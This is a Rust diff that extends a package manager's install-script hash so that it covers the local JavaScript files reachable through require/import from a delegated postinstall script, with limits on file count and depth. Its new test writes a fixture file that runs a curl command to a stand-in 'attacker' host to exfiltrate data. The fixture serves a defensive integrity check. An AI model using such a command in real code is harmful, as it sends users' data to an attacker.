@@ -66,7 +66,9 @@
 //! member's manifest) drifts the observed hash from the executed bytes.
 
 use sha2::{Digest, Sha256};
-use std::path::Path;
+use std::collections::{HashSet, VecDeque};
+use std::path::{Component, Path, PathBuf};
+use std::sync::OnceLock;
 
 use crate::EXECUTED_INSTALL_PHASES;
 use crate::static_gate::extract_delegate_path;
@@ -87,6 +89,9 @@ const FIELD_SEP: u8 = 0x00;
 /// from `RECORD_SEP` so the annotation can be distinguished from the
 /// start of the next phase.
 const DELEGATE_SEP: u8 = 0x1f;
+const DELEGATE_GRAPH_SEP: u8 = 0x1d;
+const MAX_DELEGATE_GRAPH_FILES: usize = 128;
+const MAX_DELEGATE_GRAPH_DEPTH: usize = 16;
 
 /// Compute the deterministic install-script hash for a package located at
 /// the given store directory.
@@ -153,24 +158,179 @@ pub fn compute_script_hash(store_pkg_dir: &Path) -> Option<String> {
         // the sentinel as a stable marker. Either way, the hash is
         // deterministic.
         if let Some(rel_path) = extract_delegate_path(body) {
-            hasher.update([DELEGATE_SEP]);
-            hasher.update(rel_path.as_bytes());
-            hasher.update([FIELD_SEP]);
-            let delegate_path = store_pkg_dir.join(&rel_path);
-            match std::fs::read(&delegate_path) {
-                Ok(bytes) => {
-                    let mut inner = Sha256::new();
-                    inner.update(&bytes);
-                    hasher.update(inner.finalize());
-                }
-                Err(_) => {
-                    hasher.update(b"<delegate-unreadable>");
-                }
-            }
+            hash_delegate_graph(&mut hasher, store_pkg_dir, &rel_path);
         }
     }
 
     Some(format!("sha256-{}", hex_lower(&hasher.finalize())))
+}
+
+fn hash_delegate_graph(hasher: &mut Sha256, store_pkg_dir: &Path, rel_path: &str) {
+    let Some(entry_rel) = normalize_relative_path(rel_path) else {
+        hasher.update([DELEGATE_SEP]);
+        hasher.update(rel_path.as_bytes());
+        hasher.update([FIELD_SEP]);
+        hasher.update(b"<delegate-path-invalid>");
+        return;
+    };
+
+    let root = store_pkg_dir
+        .canonicalize()
+        .unwrap_or_else(|_| store_pkg_dir.to_path_buf());
+    let mut queue = VecDeque::from([(entry_rel, 0usize)]);
+    let mut seen = HashSet::new();
+    let mut visited = 0usize;
+
+    while let Some((rel, depth)) = queue.pop_front() {
+        if visited >= MAX_DELEGATE_GRAPH_FILES {
+            hasher.update([DELEGATE_GRAPH_SEP]);
+            hasher.update(b"<delegate-graph-file-limit>");
+            break;
+        }
+        if !seen.insert(rel.clone()) {
+            continue;
+        }
+        visited += 1;
+
+        let rel_display = path_to_slash_string(&rel);
+        hasher.update([DELEGATE_SEP]);
+        hasher.update(rel_display.as_bytes());
+        hasher.update([FIELD_SEP]);
+
+        let abs = store_pkg_dir.join(&rel);
+        let canonical = match abs.canonicalize() {
+            Ok(path) => path,
+            Err(_) => {
+                hasher.update(b"<delegate-unreadable>");
+                continue;
+            }
+        };
+        if !canonical.starts_with(&root) {
+            hasher.update(b"<delegate-outside-package>");
+            continue;
+        }
+
+        let bytes = match std::fs::read(&canonical) {
+            Ok(bytes) => bytes,
+            Err(_) => {
+                hasher.update(b"<delegate-unreadable>");
+                continue;
+            }
+        };
+        let mut inner = Sha256::new();
+        inner.update(&bytes);
+        hasher.update(inner.finalize());
+
+        if depth >= MAX_DELEGATE_GRAPH_DEPTH {
+            hasher.update([DELEGATE_GRAPH_SEP]);
+            hasher.update(b"<delegate-graph-depth-limit>");
+            continue;
+        }
+
+        let mut next =
+            discover_local_js_dependencies(&bytes, rel.parent().unwrap_or(Path::new("")));
+        next.sort();
+        for candidate in next {
+            if !seen.contains(&candidate) {
+                queue.push_back((candidate, depth + 1));
+            }
+        }
+    }
+}
+
+fn discover_local_js_dependencies(bytes: &[u8], base_dir: &Path) -> Vec<PathBuf> {
+    let text = String::from_utf8_lossy(bytes);
+    let mut out = Vec::new();
+    let mut seen = HashSet::new();
+    for regex in import_regexes() {
+        for capture in regex.captures_iter(&text) {
+            let Some(spec) = capture.get(1).map(|m| m.as_str()) else {
+                continue;
+            };
+            for candidate in resolve_local_js_specifier(base_dir, spec) {
+                if seen.insert(candidate.clone()) {
+                    out.push(candidate);
+                }
+            }
+        }
+    }
+    out
+}
+
+fn import_regexes() -> &'static [regex::Regex] {
+    static REGEXES: OnceLock<Vec<regex::Regex>> = OnceLock::new();
+    REGEXES.get_or_init(|| {
+        [
+            r#"require\s*\(\s*['"]([^'"]+)['"]\s*\)"#,
+            r#"import\s*\(\s*['"]([^'"]+)['"]\s*\)"#,
+            r#"(?m)\bimport\s+(?:[^'";]+?\s+from\s+)?['"]([^'"]+)['"]"#,
+            r#"(?m)\bexport\s+[^'";]+?\s+from\s+['"]([^'"]+)['"]"#,
+        ]
+        .into_iter()
+        .map(|pattern| regex::Regex::new(pattern).expect("valid script dependency regex"))
+        .collect()
+    })
+}
+
+fn resolve_local_js_specifier(base_dir: &Path, specifier: &str) -> Vec<PathBuf> {
+    if !(specifier.starts_with("./") || specifier.starts_with("../")) {
+        return Vec::new();
+    }
+    let Some(path) = normalize_relative_path(base_dir.join(specifier)) else {
+        return Vec::new();
+    };
+    js_resolution_candidates(path)
+}
+
+fn js_resolution_candidates(path: PathBuf) -> Vec<PathBuf> {
+    if matches!(
+        path.extension().and_then(|s| s.to_str()),
+        Some("js" | "cjs" | "mjs")
+    ) {
+        return vec![path];
+    }
+
+    let mut out = Vec::with_capacity(6);
+    for ext in ["js", "cjs", "mjs"] {
+        let mut candidate = path.clone();
+        candidate.set_extension(ext);
+        out.push(candidate);
+    }
+    for ext in ["js", "cjs", "mjs"] {
+        out.push(path.join(format!("index.{ext}")));
+    }
+    out
+}
+
+fn normalize_relative_path(path: impl AsRef<Path>) -> Option<PathBuf> {
+    let mut out = PathBuf::new();
+    for component in path.as_ref().components() {
+        match component {
+            Component::CurDir => {}
+            Component::Normal(part) => out.push(part),
+            Component::ParentDir => {
+                if !out.pop() {
+                    return None;
+                }
+            }
+            Component::RootDir | Component::Prefix(_) => return None,
+        }
+    }
+    if out.as_os_str().is_empty() {
+        None
+    } else {
+        Some(out)
+    }
+}
+
+fn path_to_slash_string(path: &Path) -> String {
+    path.components()
+        .filter_map(|component| match component {
+            Component::Normal(part) => Some(part.to_string_lossy()),
+            _ => None,
+        })
+        .collect::<Vec<_>>()
+        .join("/")
 }
 
 /// Encode bytes as lowercase hex without pulling in a hex crate.
@@ -448,6 +608,38 @@ mod tests {
         let h1 = compute_script_hash(dir1.path()).unwrap();
         let h2 = compute_script_hash(dir2.path()).unwrap();
         assert_ne!(h1, h2);
+    }
+
+    #[test]
+    fn compute_script_hash_changes_when_reachable_required_file_changes() {
+        let dir1 = tempdir().unwrap();
+        let dir2 = tempdir().unwrap();
+        write_pkg_json(
+            dir1.path(),
+            &serde_json::json!({"postinstall": "node setup.js"}),
+        );
+        write_pkg_json(
+            dir2.path(),
+            &serde_json::json!({"postinstall": "node setup.js"}),
+        );
+        fs::write(dir1.path().join("setup.js"), b"require('./payload.js')\n").unwrap();
+        fs::write(dir2.path().join("setup.js"), b"require('./payload.js')\n").unwrap();
+        fs::write(
+            dir1.path().join("payload.js"),
+            b"module.exports = 'benign'\n",
+        )
+        .unwrap();
+        fs::write(
+            dir2.path().join("payload.js"),
+            b"require('child_process').execSync('curl http://attacker/exfil')\n",
+        )
+        .unwrap();
+
+        assert_ne!(
+            compute_script_hash(dir1.path()).unwrap(),
+            compute_script_hash(dir2.path()).unwrap(),
+            "changes in files statically required by the delegated entry point must affect script_hash"
+        );
     }
 
     /// Every spelling the static gate greenlights via a
